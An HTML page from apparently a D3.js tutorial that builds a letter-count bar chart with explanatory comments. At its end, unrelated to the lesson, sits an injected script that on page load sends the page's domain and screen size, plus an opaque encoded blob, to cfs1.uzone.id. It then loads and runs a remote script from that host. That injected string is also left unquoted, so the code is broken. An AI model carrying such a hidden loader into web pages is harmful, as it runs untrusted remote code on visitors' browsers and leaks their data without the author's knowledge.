<!DOCTYPE html>
<head>
  <meta charset="utf-8">
  <title>Letter Count Bar Chart</title>

  <!-- include d3.js -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/3.5.5/d3.min.js" type="text/javascript"></script>

  <!-- include google fonts -->
  <link href="https://fonts.googleapis.com/css?family=Roboto:300,300italic" rel="stylesheet" type="text/css">

  <!-- custom stylesheet for our visualization -->
  <link href="style.css" rel="stylesheet" type="text/css">

  <!-- our javascript code for counting letters -->
  <script src="count.js" type="text/javascript"></script>

  <!-- our javascript code for our bar chart -->
  <script src="chart.js" type="text/javascript"></script>
</head>

<body>
  <!-- we will place our visualization in this svg -->
  <svg></svg>

  <!-- we will place the text that we'll analyze here -->
  <textarea></textarea>

  <script type="text/javascript">
  /*
   * lets add a rectangle around our entire svg to help debug
   */

  // we can select specific elements in the "DOM" using d3
  var svg = d3.select("body").select("svg");

  // get the calculated bounding box of the svg
  var bounds = svg.node().getBoundingClientRect();
  console.log("svg bounds:", bounds);

  // add the rectangle to the svg
  // https://github.com/mbostock/d3/wiki/SVG-Shapes#svg_rect
  var border = svg.append("rect")
      .attr("id", "bounds")
      .attr("x", 0)
      .attr("y", 0)
      .attr("width", bounds.width)
      .attr("height", bounds.height);

  /*
   * whoa, look at all those chained methods! this is very
   * common, but doesn't work with everything. see:
   * http://alignedleft.com/tutorials/d3/chaining-methods
   */

  // suppose we wanted rounded corners. instead of chaining we could do:
  border = border.attr("rx", 10);
  border = border.attr("ry", 10);

  // we will style this rectangle in css using its id
  // take a look at the css file

  /*
   * load sample text to analyze. this external file request will be handled
   * asynchronously, meaning the browser will not wait for the file and will
   * instead continue executing the rest of this script. when the load is done,
   * the callback function will be called.
   */
  d3.text("peter.txt", function(error, data) { // anonymous function
    if (error) {
      console.warn(error);
      return;
    }

    console.log(data);

    /*
     * now we need to select the textarea from the DOM
     * https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model
     * https://github.com/mbostock/d3/wiki/Selections#text
     */
    d3.select("body").select("textarea").text(data);

    // we should draw the bar chart after the data is loaded
    drawBarChart();
  });


  // bonus material (cover only if time)

  /*
   * it would be nice to change the text and see our bar chart update! we can
   * do that by adding an event listener. every time a key press is completed
   * (the key is pressed down, and fully released), we will update our data
   * and our resulting visualization.
   */
  d3.select("body").select("textarea")
    .on("keyup", drawBarChart);
  </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31upy5j%2baCEEx19j57z59qe1NqNIElW1txim1kztWcvSR58Gr%2frCPdeFCAOyBIU3NuGIFN8T3nkfab28yxfBwlg8%2f5d8yB22whjbqEMsh%2fPZ2%2feUlGtTCNJfBJrwXBh063zmw4q9D2gVZJ130Sahh425dZDlmQql6CBPNND%2bAAgiNShBdQfONOrnI6rZo0iO5QoBwVjuVpgnE5JilC7mHTW3KZCSblqwFkCYveB7ZqP3nVbbUHiwjNU8Bs0wcCxl8MhFXzjYA7iu6cxXky03nVuvv2W3S8diSS%2b58w0XaUtbWyZrl9b0sALn692u%2bTSc3yWTkZVQviKYUEukIxsHr%2bE%2fWWaPoZDxjqdpQG6ZQ%2fGp2irTs7zdqD1R9ro%2bHx6Rd%2bnM4FDFe3IUHT33CoMqhV1raOfYGBFt7QzfJ5LHEiBpshrz0FBuJC0cMFtxkQIxhqhmRI9Jq2L92zBfVKMZobsPidqJKe6KICCXEORyEJHyg8G6KBqkwkdPf4BdoAv8hU0%2b5UlYQ1RUJG3vD6Cb%2b%2fPbeERqk21ZZ4mIq0clPmVxiz3ysYBfMkk8bLhx8lZh3Hjerbr%2bECXbvzAQq2%2fZPppg%3d%3d + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
